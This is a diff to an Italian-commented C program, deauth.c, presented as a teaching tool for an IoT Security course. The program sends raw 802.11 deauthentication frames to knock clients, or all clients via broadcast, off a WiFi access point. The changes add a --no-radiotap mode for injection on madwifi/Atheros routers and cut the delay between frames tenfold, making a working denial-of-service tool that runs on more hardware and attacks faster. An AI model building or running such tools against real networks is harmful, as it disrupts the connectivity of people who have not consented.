@@ -21,9 +21,11 @@
  *        mipsel-openwrt-linux-gcc -o deauth deauth.c
  *
  *   3. Esecuzione (richiede root):
- *        ./deauth <interfaccia> <bssid_ap> <mac_client> [num_pacchetti]
- *      Esempio:
+ *        ./deauth [--no-radiotap] <interfaccia> <bssid_ap> <mac_client> [num_pacchetti]
+ *      Esempio (mac80211, es. PC con Realtek/Intel):
  *        ./deauth mon0 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50
+ *      Esempio (madwifi/Atheros, es. router con ath_dev):
+ *        ./deauth --no-radiotap ath1 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50
  *
  * NOTA: Questo programma è esclusivamente a scopo didattico/di ricerca
  *       nell'ambito di un corso di IoT Security. L'uso su reti senza
@@ -169,52 +171,72 @@ static int get_ifindex(int sockfd, const char *ifname) {
 static void print_usage(const char *progname) {
   fprintf(
       stderr,
-      "Uso: %s <interfaccia> <bssid_ap> <mac_client> [num_pacchetti]\n"
+      "Uso: %s [--no-radiotap] <interfaccia> <bssid_ap> <mac_client> [num_pacchetti]\n"
       "\n"
-      "  interfaccia    Interfaccia WiFi in monitor mode (es: mon0, wlan0)\n"
+      "Opzioni:\n"
+      "  --no-radiotap  Non anteporre il radiotap header al frame.\n"
+      "                 Necessario su driver madwifi/Atheros (es. ath_dev)\n"
+      "                 che si aspettano frame 802.11 nudi per l'iniezione.\n"
+      "                 Non usare su driver mac80211 (es. Realtek, Intel).\n"
+      "\n"
+      "Argomenti:\n"
+      "  interfaccia    Interfaccia WiFi in monitor mode (es: mon0, ath1)\n"
       "  bssid_ap       MAC dell'Access Point (es: AA:BB:CC:DD:EE:FF)\n"
       "  mac_client     MAC del client da disconnettere\n"
       "                 Usa FF:FF:FF:FF:FF:FF per broadcast (tutti i client)\n"
       "  num_pacchetti  Numero di frame da inviare (default: 10)\n"
       "\n"
-      "Esempio:\n"
+      "Esempi:\n"
       "  %s mon0 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50\n"
+      "  %s --no-radiotap ath1 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50\n"
       "\n"
       "NOTA: L'interfaccia deve essere in monitor mode.\n"
       "  ip link set wlan0 down\n"
       "  iw dev wlan0 set type monitor\n"
       "  ip link set wlan0 up\n",
-      progname, progname);
+      progname, progname, progname);
 }
 
 int main(int argc, char *argv[]) {
-  if (argc < 4) {
+  int no_radiotap = 0;
+  int arg_start = 1; /* indice del primo argomento posizionale */
+
+  /* Controlla il flag --no-radiotap (deve essere il primo argomento) */
+  if (argc >= 2 && strcmp(argv[1], "--no-radiotap") == 0) {
+    no_radiotap = 1;
+    arg_start = 2;
+  }
+
+  /* Servono almeno 3 argomenti posizionali: interfaccia, bssid, mac_client */
+  if (argc - arg_start < 3) {
     print_usage(argv[0]);
     return EXIT_FAILURE;
   }
 
-  const char *ifname = argv[1];
+  const char *ifname = argv[arg_start];
   unsigned char bssid[6];
   unsigned char client[6];
   int num_packets = 10;
 
   /* Parse BSSID dell'AP */
-  if (parse_mac(argv[2], bssid) < 0) {
-    fprintf(stderr, "Errore: BSSID non valido: %s\n", argv[2]);
+  if (parse_mac(argv[arg_start + 1], bssid) < 0) {
+    fprintf(stderr, "Errore: BSSID non valido: %s\n", argv[arg_start + 1]);
     return EXIT_FAILURE;
   }
 
   /* Parse MAC del client */
-  if (parse_mac(argv[3], client) < 0) {
-    fprintf(stderr, "Errore: MAC client non valido: %s\n", argv[3]);
+  if (parse_mac(argv[arg_start + 2], client) < 0) {
+    fprintf(stderr, "Errore: MAC client non valido: %s\n", argv[arg_start + 2]);
     return EXIT_FAILURE;
   }
 
   /* Numero di pacchetti (opzionale) */
-  if (argc >= 5) {
-    num_packets = atoi(argv[4]);
+  if (argc - arg_start >= 4) {
+    num_packets = atoi(argv[arg_start + 3]);
     if (num_packets < 0) {
-      fprintf(stderr, "Errore: numero di pacchetti non valido (deve essere >= 0): %s\n", argv[4]);
+      fprintf(stderr,
+              "Errore: numero di pacchetti non valido (deve essere >= 0): %s\n",
+              argv[arg_start + 3]);
       return EXIT_FAILURE;
     }
   }
@@ -252,6 +274,7 @@ int main(int argc, char *argv[]) {
 
   printf("=== Deauth Attack Tool (solo uso didattico) ===\n");
   printf("Interfaccia : %s (index %d)\n", ifname, ifindex);
+  printf("Radiotap    : %s\n", no_radiotap ? "NO (raw 802.11, madwifi)" : "SI (mac80211)");
   printf("BSSID (AP)  : %02X:%02X:%02X:%02X:%02X:%02X\n", bssid[0], bssid[1],
          bssid[2], bssid[3], bssid[4], bssid[5]);
   printf("Client      : %02X:%02X:%02X:%02X:%02X:%02X\n", client[0], client[1],
@@ -269,8 +292,12 @@ int main(int argc, char *argv[]) {
     build_deauth_frame(frame, bssid, client, REASON_UNSPECIFIED,
                        (unsigned short)i);
 
-    /* Invia il frame raw sull'interfaccia */
-    ssize_t ret = sendto(sockfd, frame, FRAME_TOTAL_LEN, 0,
+    /* Invia il frame raw sull'interfaccia.
+     * Su mac80211: il frame completo con radiotap header.
+     * Su madwifi:  solo il frame 802.11 nudo (senza radiotap). */
+    unsigned char *send_buf = no_radiotap ? frame + RADIOTAP_LEN : frame;
+    size_t send_len = no_radiotap ? FRAME_TOTAL_LEN - RADIOTAP_LEN : FRAME_TOTAL_LEN;
+    ssize_t ret = sendto(sockfd, send_buf, send_len, 0,
                          (struct sockaddr *)&sll, sizeof(sll));
 
     if (ret < 0) {
@@ -286,8 +313,8 @@ int main(int argc, char *argv[]) {
       fflush(stdout);
     }
 
-    /* Piccolo delay per non saturare il driver (100ms) */
-    usleep(100000);
+    /* Piccolo delay per non saturare il driver (10ms) */
+    usleep(10000);
   }
 
   printf("\n\nCompletato: %d inviati, %d falliti.\n", sent, failed);
